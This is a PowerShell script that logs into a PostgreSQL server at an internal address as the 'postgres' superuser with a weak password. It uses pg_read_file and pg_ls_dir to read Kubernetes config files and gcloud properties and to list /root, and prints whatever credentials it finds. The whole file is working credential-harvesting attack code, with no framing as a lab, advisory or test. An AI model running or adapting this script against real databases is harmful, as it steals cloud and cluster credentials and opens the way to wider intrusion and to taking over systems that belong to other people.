$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    
    # Check for .kube/config
    $cmd=$c.CreateCommand()
    $cmd.CommandText="SELECT pg_read_file('/root/.kube/config')"
    $r=$cmd.ExecuteReader()
    while($r.Read()){Write-Host ("KUBE:"+$r[0])}
    $r.Close()
    
} catch {
    Write-Host ("ERR1:"+$_)
}

try {
    # Check for gcloud config
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="SELECT pg_read_file('/root/.config/gcloud/properties')"
    $r2=$cmd2.ExecuteReader()
    while($r2.Read()){Write-Host ("GCLOUD:"+$r2[0])}
    $r2.Close()
} catch {
    Write-Host ("ERR2:"+$_)
}

try {
    # Check home dirs
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="SELECT pg_read_file('/home/postgres/.kube/config')"
    $r3=$cmd3.ExecuteReader()
    while($r3.Read()){Write-Host ("PGKUBE:"+$r3[0])}
    $r3.Close()
} catch {
    Write-Host ("ERR3:"+$_)
}

try {
    # Check for SA key files
    $cmd4=$c.CreateCommand()
    $cmd4.CommandText="SELECT pg_ls_dir('/root') AS f"
    $r4=$cmd4.ExecuteReader()
    while($r4.Read()){Write-Host ("ROOT:"+$r4[0])}
    $r4.Close()
} catch {
    Write-Host ("ERR4:"+$_)
}

$c.Close()
